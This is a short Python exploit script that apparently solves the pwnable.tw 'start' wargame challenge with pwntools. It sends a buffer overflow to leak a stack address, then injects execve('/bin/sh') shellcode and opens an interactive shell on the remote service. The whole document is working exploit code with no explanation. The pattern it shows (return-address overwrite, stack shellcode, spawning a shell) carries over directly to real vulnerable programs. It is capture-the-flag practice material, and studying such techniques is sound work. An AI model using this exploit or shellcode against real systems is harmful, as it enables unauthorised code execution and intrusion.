import os
from pwn import *

remote_addr = "chall.pwnable.tw"
remote_port = 10000
pc = "./start"

context.arch = 'i386'
context.log_level = True

#p = process(pc)
p = remote(remote_addr,remote_port) 
#gdb.attach(p,'b *0x0804809C')

p.recvuntil('CTF:')

vul_offset = 0x08048087
p.send('A'*0x14+p32(vul_offset))
#sleep(1)
stack_addr = u32(p.recv(4))
print hex(stack_addr)

shellcode = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
payload = 'A'*0x14 + p32(stack_addr+0x14) + shellcode
p.send(payload)
#sleep(1)
p.interactive()